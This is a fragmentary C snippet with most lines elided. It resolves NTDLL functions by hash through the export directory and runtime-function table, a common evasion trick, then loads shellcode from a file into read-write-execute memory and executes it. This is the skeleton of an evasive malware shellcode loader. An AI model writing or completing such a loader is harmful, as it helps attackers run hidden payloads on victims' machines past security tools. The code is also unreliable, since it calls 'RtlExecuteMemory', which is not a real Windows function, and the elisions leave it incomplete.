...
EXTERN_C PVOID GetNTDLLFunc(DWORD func) {
    ...
    for (DWORD i = 0; i < expDir->NumberOfFunctions; i++) {
        ...
        if (funcHash == func) {
            funcRVA = (DWORD_PTR)dllBase + (DWORD_PTR)addrFunctions[addrOrds[i]];
        ...
        for (int j = 0; j < exp->NumberOfFunctions; j++) {
            ...
            if (adr[ord[j]] == rtf[i].BeginAddress) {
                ...
                if (funcNameHash == func) {
                    ...
                    funcRVA = (PDWORD)((DWORD_PTR)dllBase + functionAddressRVA);
...
int main() {
    ...
    // Load the shellcode from a file
    ...
    PVOID shellcodeAddr = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ...
    RtlCopyMemory(shellcodeAddr, shellcode, size);

    // Execute the shellcode
    RtlExecuteMemory(shellcodeAddr, size);
